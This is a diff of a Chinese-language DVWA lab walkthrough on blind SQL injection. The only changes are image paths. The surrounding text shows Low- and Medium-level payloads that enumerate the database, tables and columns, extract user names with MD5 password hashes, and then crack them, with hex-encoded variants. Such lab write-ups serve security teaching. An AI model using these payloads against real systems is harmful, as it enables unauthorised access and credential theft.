@@ -52,17 +52,17 @@ if( isset( $_GET[ 'Submit' ] ) ) {
 ```
 1' and substr(database(),1,1)='a'#
 ```
-![image-20210414161636813.png](./assets/1655880002677-4d82483c-309e-4f3f-a350-d291752aa122.png)
+![image-20210414161636813.png](_img/assets/1655880002677-4d82483c-309e-4f3f-a350-d291752aa122.png)
 
-得到库名dvwa<br />![image-20210414161716191.png](./assets/1655880008249-ca6ff68a-b358-4eb5-b5d8-b7695a873299.png)
+得到库名dvwa<br />![image-20210414161716191.png](_img/assets/1655880008249-ca6ff68a-b358-4eb5-b5d8-b7695a873299.png)
 
 判断数据库dvwa中的表
 ```
 1' and substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1)='a'#
 ```
-![image-20210414162659468.png](./assets/1655880014010-9836d01e-2bc6-4b5f-9cbb-c57813d9f9cf.png)
+![image-20210414162659468.png](_img/assets/1655880014010-9836d01e-2bc6-4b5f-9cbb-c57813d9f9cf.png)
 
-![image-20210414162632646.png](./assets/1655880016524-cfb1be30-37e6-4089-b871-9d251e5695b2.png)
+![image-20210414162632646.png](_img/assets/1655880016524-cfb1be30-37e6-4089-b871-9d251e5695b2.png)
 
 得到表gustbook和users
 
@@ -70,9 +70,9 @@ if( isset( $_GET[ 'Submit' ] ) ) {
 ```
 1' and substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='a'#
 ```
-![image-20210414164244111.png](./assets/1655880025865-823e2b90-1c1c-4416-9021-aa8405eed74f.png)
+![image-20210414164244111.png](_img/assets/1655880025865-823e2b90-1c1c-4416-9021-aa8405eed74f.png)
 
-![image-20210414164307257.png](./assets/1655880028372-6d2a0ed3-ae1c-4fa5-938a-38cafe16537d.png)
+![image-20210414164307257.png](_img/assets/1655880028372-6d2a0ed3-ae1c-4fa5-938a-38cafe16537d.png)
 
 得到users表中的字段：id、login······
 
@@ -80,11 +80,11 @@ if( isset( $_GET[ 'Submit' ] ) ) {
 ```
 1' and substr((select concat_ws('-',user,password) from dvwa.users limit 0,1),1,1)='a'#
 ```
-![image-20210414170504825.png](./assets/1655880035558-06918812-faa9-4754-8ac3-ea2eb3fa8530.png)
+![image-20210414170504825.png](_img/assets/1655880035558-06918812-faa9-4754-8ac3-ea2eb3fa8530.png)
 
-得到账户和MD5<br />![image-20210414170914553.png](./assets/1655880041739-77b889c9-1ca8-49b0-9f36-82042f895109.png)
+得到账户和MD5<br />![image-20210414170914553.png](_img/assets/1655880041739-77b889c9-1ca8-49b0-9f36-82042f895109.png)
 
-解密得到明文<br />![image-20210414143459141.png](./assets/1655880049479-ee8cc0fc-55f5-49f2-9bf7-a2a932074df5.png)
+解密得到明文<br />![image-20210414143459141.png](_img/assets/1655880049479-ee8cc0fc-55f5-49f2-9bf7-a2a932074df5.png)
 
 
 ## 2、Medium
@@ -151,30 +151,30 @@ escapestring:必需。要转义的字符串。编码的字符是 NUL（ASCII 0�
 number = input("请输入要转换字符(连续输入不需要空格)：")numbers = list(number)with open('ascii16.txt','w') as asciis16:    for number1 in numbers:        number = hex(ord(number1))        asciis16.write(number + '\n')
 ```
 
-得到数据库名字dvwa<br />![image-20210415151801837.png](./assets/1655880071524-93ac7220-dcd6-4224-821f-b1a269292fab.png)
+得到数据库名字dvwa<br />![image-20210415151801837.png](_img/assets/1655880071524-93ac7220-dcd6-4224-821f-b1a269292fab.png)
 
 判断数据库中的表
 ```
 1 and substr((select table_name from information_schema.tables where table_schema=0x64767761 limit 0,1),1,1)=0x61
 ```
 
-得到表gustbook，users<br />![image-20210415153338386.png](./assets/1655880078165-7e5e8499-9e17-402d-89bc-e7bbf6a51187.png)
+得到表gustbook，users<br />![image-20210415153338386.png](_img/assets/1655880078165-7e5e8499-9e17-402d-89bc-e7bbf6a51187.png)
 
 判断users中的字段
 ```
 1 and substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 0,1),1,1)=0x61
 ```
 
-得到字段id、login······<br />![image-20210415154023783.png](./assets/1655880084376-ad799e91-fc85-4fc5-b793-1724b4581aeb.png)
+得到字段id、login······<br />![image-20210415154023783.png](_img/assets/1655880084376-ad799e91-fc85-4fc5-b793-1724b4581aeb.png)
 
 判断字段user，password的第一个值
 ```
 1 and substr((select concat_ws(0x2d,user,password) from dvwa.users limit 0,1),1,1)=0x61
 ```
 
-得到第一个账号和MD5值<br />![image-20210415160019399.png](./assets/1655880102235-ea0fa526-7cc2-4ca3-9e5e-beb2a93c079c.png)
+得到第一个账号和MD5值<br />![image-20210415160019399.png](_img/assets/1655880102235-ea0fa526-7cc2-4ca3-9e5e-beb2a93c079c.png)
 
-解密得<br />![image-20210414143459141.png](./assets/1655880104911-62c4e6cc-1d62-4faf-9110-a9e46a453171.png)
+解密得<br />![image-20210414143459141.png](_img/assets/1655880104911-62c4e6cc-1d62-4faf-9110-a9e46a453171.png)
 
 
 
